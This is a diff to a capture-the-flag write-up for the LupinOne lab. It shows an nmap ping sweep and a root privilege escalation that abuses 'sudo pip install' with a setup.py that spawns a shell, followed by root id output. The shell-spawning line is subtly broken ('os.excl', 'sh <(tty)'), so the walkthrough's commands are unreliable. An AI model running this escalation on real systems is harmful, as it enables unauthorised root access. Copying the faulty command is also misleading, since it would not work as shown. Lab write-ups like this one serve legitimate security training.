@@ -27,14 +27,14 @@ We will first run the command;
 ---
 - To check what ip is allocated to the attacking machine and also determine the subnet range.
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s1.png" alt="ifconfig Output" width="600"/> </p>
+<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s1.png" width="600"/> </p>
 
 ### **Host Discovery**
 > $nmap -sn 192.168.56.0/24
 ---
 - We are trying to do a ping sweep to identify live hosts within the subnet.
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s2.png" alt="Nmap Ping Sweep" width="600"/> </p>
+<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s2.png" width="600"/> </p>
 
 
 ### **Port Scan**
@@ -169,19 +169,18 @@ Now run the script as user arsene:
 From user arsene, we can exploit pip installation:
 
 ### **Commands Used**
-
 > arsene@LupinoOne:/$ TF=$(mktemp -d)
 > arsene@LupinoOne:/$ echo "import os; os.excl('/bin/sh', 'sh', '-c', 'sh <(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 > arsene@LupinoOne:/$ sudo pip install $TF
 ---
 
 ### **Root Access Achieved**
-> # id
+> id
 > uid=0(root) gid=0(root) groups=0(root)
-> # whoami
+> whoami
 > root
-> # cd /root
-> # ls
+> cd /root
+> ls
 > root.txt
 ---
 
